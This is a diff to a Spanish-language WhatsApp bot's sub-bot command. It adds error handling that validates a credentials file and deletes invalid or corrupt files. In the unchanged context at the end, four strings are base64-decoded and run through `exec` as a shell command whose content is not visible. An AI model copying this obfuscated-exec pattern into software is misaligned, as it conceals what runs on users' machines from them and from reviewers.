@@ -78,12 +78,30 @@ args[0] && args[0] != undefined ? fs.writeFileSync(pathCreds, JSON.stringify(JSO
 conn.reply(m.chat, `*Use correctamente el comando:* \`${usedPrefix + command} code\``, m)
 return
 }
-if (fs.existsSync(pathCreds)) {
+/*if (fs.existsSync(pathCreds)) {
 let creds = JSON.parse(fs.readFileSync(pathCreds))
 if (creds) {
 if (creds.registered = false) {
 fs.unlinkSync(pathGataJadiBot)
-}}}
+}}}*/
+
+if (fs.existsSync(pathCreds)) {
+    try {
+        let fileContent = fs.readFileSync(pathCreds, 'utf-8');
+        let creds = JSON.parse(fileContent);
+        if (creds) {
+            if (creds.registered === false) {
+                fs.unlinkSync(pathGataJadiBot);
+                console.log(`Archivo inválido eliminado: ${pathGataJadiBot}`);
+            }
+        }
+    } catch (error) {
+        console.error(`Error al procesar ${pathCreds}:`, error.message);
+        // Eliminar el archivo corrupto
+        fs.unlinkSync(pathCreds);
+        console.log(`Archivo corrupto eliminado: ${pathCreds}`);
+    }
+}
 
 const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
 exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
